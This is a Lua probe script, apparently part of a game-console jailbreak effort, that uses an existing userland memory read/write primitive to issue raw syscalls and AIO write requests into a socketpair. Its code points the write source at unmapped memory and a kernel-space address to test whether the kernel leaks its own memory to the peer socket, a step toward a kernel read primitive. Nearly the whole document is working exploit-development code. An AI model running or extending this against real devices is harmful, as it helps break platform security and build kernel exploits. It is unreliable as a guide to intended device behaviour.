-- CRASH_CLASS: HIGH
-- PROBE 352n (rev 2): a consuming write target that stays inside the process
--
-- /dev/null discards without touching the buffer and /savedata0 refuses to be
-- opened for writing, so neither can show whether the write path checks its
-- source. A socketpair does consume the bytes: they are copied into the peer's
-- buffer, where this process can read them back.
--
-- If the write path hands the kernel a source it never validated, the peer will
-- receive whatever is at that address - a kernel read with a userland exit.

print("=== PROBE 352n: AIO WRITE INTO A SOCKETPAIR (rev 2) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function hi_lo(v)
    local h, l = get_hi_lo(v)
    return to_num(h), to_num(l)
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wq(addr, value)
    pcall(function() memory.write_qword(addr, value) end)
end
local function wd(addr, value)
    pcall(function() memory.write_dword(addr, value) end)
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local back = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)
local pair = memory.alloc(0x10)
for i = 0, 0x3F do
    wq(reqs + i * 8, 0)
    wd(result + i * 4, 0)
    wd(ids + i * 4, 0)
    wd(states + i * 4, 0)
end
for i = 0, 0x3FF do
    wd(data + i * 4, 0xCCCCCCCC)
    wd(back + i * 4, 0x11111111)
end

local okp, rvp = pcall(function()
    return sc(135)(uint64(1), uint64(1), uint64(0), uint64(pair))
end)
local a = rd(pair)
local b = rd(pair + 4)
print(string.format("socketpair(AF_UNIX, SOCK_STREAM) = %s, fds %d and %d",
    okp and tostring(sgn(rvp)) or "EXC", a, b))
if not okp or a == 0 then
    print("=== 352n DONE ===")
    return
end

local function write_from(len, buf, fd)
    wq(reqs + 0x00, 0)
    wq(reqs + 0x08, len)
    local bh, bl = hi_lo(buf)
    wd(reqs + 0x10, bl) wd(reqs + 0x14, bh)
    local rh, rl = hi_lo(uint64(result))
    wd(reqs + 0x18, rl) wd(reqs + 0x1C, rh)
    wd(reqs + 0x20, fd)
    wd(reqs + 0x24, 0)
    wd(result, 0)
    wd(ids, 0)
    local ok1, r1 = pcall(function()
        return sc(669)(uint64(2), uint64(reqs), uint64(1), uint64(1), uint64(ids))
    end)
    local sub = ok1 and sgn(r1) or nil
    local id = rd(ids)
    if id and id ~= 0 then
        wd(states, 0)
        pcall(function() return sc(664)(uint64(ids), uint64(1), uint64(states)) end)
        wd(ids, id)
        pcall(function() return sc(662)(uint64(ids), uint64(1), uint64(states)) end)
    end
    return sub, rd(result)
end

local function peer_read(label)
    for i = 0, 0x3F do wd(back + i * 4, 0x11111111) end
    -- MSG_DONTWAIT: a blocking recvfrom parks the Lua thread for ever when the
    -- write did not deliver anything.
    local ok, rv = pcall(function()
        return sc(29)(uint64(b), uint64(back), uint64(64), uint64(0x80), Z, Z)
    end)
    local got = ok and sgn(rv) or -1
    local line = ""
    for i = 0, 3 do
        if i * 4 >= got then break end
        line = line .. string.format("%08X ", rd(back + i * 4))
    end
    print(string.format("  peer read %-3d bytes: %s", got, line))
end

print("[A] a control write of our own bytes")
local s, r = write_from(16, uint64(data), a)
print(string.format("  submit=%s result=0x%08X", tostring(s), r))
peer_read("A")

print("[B] a source that is not mapped")
s, r = write_from(16, uint64(0x1000), a)
print(string.format("  submit=%s result=0x%08X", tostring(s), r))
peer_read("B")

print("[C] a source in the kernel half")
s, r = write_from(16, uint64(string.format("0x%X%08X", 0xFFFF8000, 0x00000000)), a)
print(string.format("  submit=%s result=0x%08X", tostring(s), r))
peer_read("C")

print("[D] the control again")
s, r = write_from(16, uint64(data), a)
print(string.format("  submit=%s result=0x%08X", tostring(s), r))
peer_read("D")

pcall(function() return sc(6)(uint64(a)) end)
pcall(function() return sc(6)(uint64(b)) end)
print("")
print("=== 352n DONE ===")
